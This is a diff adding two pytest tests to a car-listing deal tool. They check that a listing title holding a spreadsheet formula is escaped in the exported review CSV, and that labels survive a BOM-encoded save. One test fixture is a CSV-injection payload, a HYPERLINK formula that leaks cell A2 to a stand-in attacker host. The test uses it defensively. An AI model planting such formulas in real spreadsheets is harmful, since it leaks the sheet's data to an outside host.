@@ -267,3 +267,24 @@ def test_cli_run_is_isolated_and_exit_code_says_not_real(tmp_path):
     assert rep["isolation"]["database"] == {"engine": "sqlite", "path": str(out / "harness.db")}
     assert rep["funnel"]["trusted_candidates"] >= 1
     assert oct((out).stat().st_mode & 0o777) == oct(0o700)
+
+
+def test_review_sheet_cannot_carry_spreadsheet_formulas(stand, tmp_path):
+    stand.pages = [market() + [item(9, 6900, title='=HYPERLINK("https://evil.example/?d="&A2) 2015 Toyota Camry SE 130k miles')]]
+    run(tmp_path)
+    rows = {r["source_listing_id"]: r for r in csv.DictReader((tmp_path / "run" / "review.csv").open())}
+    assert rows["v1|9|0"]["title"].startswith("'=")
+
+
+def test_labels_survive_a_sheet_saved_with_a_bom(stand, tmp_path):
+    import validate_deals as vd
+    run(tmp_path)
+    sheet = tmp_path / "run" / "review.csv"
+    rows = list(csv.DictReader(sheet.open()))
+    rows[0]["outcome_label"] = "genuine_opportunity"
+    with sheet.open("w", newline="", encoding="utf-8-sig") as f:      # as Excel saves it
+        w = csv.DictWriter(f, fieldnames=list(rows[0]))
+        w.writeheader()
+        w.writerows(rows)
+    rep = vd.build_report(tmp_path / "run")
+    assert sum(1 for c in rep["candidates"] if c["outcome_label"]) == 1
